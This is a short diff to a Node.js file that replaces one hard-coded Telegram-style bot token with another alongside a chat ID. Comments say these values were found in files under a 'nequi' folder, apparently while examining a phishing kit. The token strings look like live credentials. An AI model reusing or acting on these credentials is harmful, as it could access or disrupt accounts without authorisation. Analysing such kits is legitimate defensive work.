@@ -1,7 +1,7 @@
 const https = require('https');
 
 // Token found in public/nequi/server.js
-const token = '8594588884:AAFq6nlhKzJL8Ahdhe2P0B-8ThQkIwvCEpM';
+const token = '8634395375:AAFb8HHwRA14QoyU769lYso0I7hlD_c0Ias';
 // Chat ID found in public/nequi/dynamic-key.js
 const chatId = '-5017945956';
 
